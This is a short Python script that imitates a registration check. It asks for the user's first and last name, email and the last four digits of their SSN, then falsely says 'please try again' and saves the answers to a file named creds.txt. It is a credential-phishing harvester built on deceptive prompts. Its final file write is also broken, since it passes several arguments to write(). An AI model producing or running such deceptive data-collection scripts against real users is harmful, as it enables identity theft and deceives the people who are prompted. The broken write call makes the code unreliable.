#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Jun 30 18:31:39 2017

@author: eccentric7
"""
import time

print('Your registration is almost complete thank you for you patience')
fn = input('Please enter your first name please:')
ln = input('Please enter your last name please:')
em = input('Please enter your primary email used to register')
print('one moment')
time.sleep(3)
print(fn,"Thank you!, Please provide last 4 of your SSN to authenticate your account.")
l4 = input("Last 4: ")


time.sleep(3)
print("please try again")
saveFile = open("/home/eccentric7/creds/creds.txt",'w')
saveFile.write(fn,ln,em,l4)
saveFile.close()